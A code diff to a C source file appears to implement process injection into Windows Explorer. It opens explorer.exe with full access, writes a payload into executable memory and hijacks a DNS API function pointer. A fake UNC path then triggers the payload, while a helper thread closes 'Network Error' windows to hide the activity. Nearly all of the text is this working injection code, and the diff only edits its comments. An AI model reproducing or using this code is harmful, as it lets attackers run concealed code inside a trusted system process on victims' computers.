@@ -201,8 +201,7 @@ LPVOID GetDnsApiAddr(DWORD pid) {
     return va;
 }
 
-// thread to loop until hEvent signalled to end
-// for any windows with "Network Error" in it, closes the window
+// for any "Network Error", close the window
 VOID SuppressErrors(LPVOID lpParameter) {
     HWND hw;
     
@@ -224,6 +223,7 @@ VOID dns_inject(LPVOID payload, DWORD payloadSize) {
     WCHAR  unc[32]={L'\\', L'\\'}; // UNC path to invoke DNS api
 
     // 1. obtain process id for explorer
+    //    and try read address of function pointers
     GetWindowThreadProcessId(GetShellWindow(), &pid); 
     ptr = GetDnsApiAddr(pid);
     
@@ -231,8 +231,8 @@ VOID dns_inject(LPVOID payload, DWORD payloadSize) {
     ht = CreateThread(NULL, 0, 
       (LPTHREAD_START_ROUTINE)SuppressErrors, NULL, 0, NULL);
       
-    // 3. if dns api not loaded, try force explorer to load it
-    //    by requesting access to a fake UNC path
+    // 3. if dns api not already loaded, try force 
+    // explorer to load via fake UNC path
     if(ptr == NULL) {
       tick = GetTickCount();
       for(i=0; i<8; i++) {
@@ -244,7 +244,7 @@ VOID dns_inject(LPVOID payload, DWORD payloadSize) {
     }
     
     if(ptr != NULL) {
-      // 2. open explorer, read address of dns function.
+      // 4. open explorer, backup address of dns function.
       //    allocate RWX memory and write payload
       hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
       ReadProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
@@ -252,26 +252,22 @@ VOID dns_inject(LPVOID payload, DWORD payloadSize) {
         MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
       WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
       
-      // 3. overwrite pointer to dns function
+      // 5. overwrite pointer to dns function
+      //    generate fake UNC path and trigger execution
       WriteProcessMemory(hp, ptr, &cs, sizeof(ULONG_PTR), &wr);
-      
-      // 4. generate "random" unc path so DNS api called
       tick = GetTickCount();
       for(i=0; i<8; i++) {
         unc[2+i] = (tick % 26) + L'a';
         tick >>= 2;
       }
-    
-      // 5. trigger execution of payload
       ShellExecInExplorer(unc);
       
-      // 6. restore value of pointer
+      // 6. restore dns function, release memory and close process
       WriteProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
-      
-      // 7. Release memory for code
       VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
       CloseHandle(hp);
     }
+    // 7. terminate thread
     TerminateThread(ht, 0);
 }
 
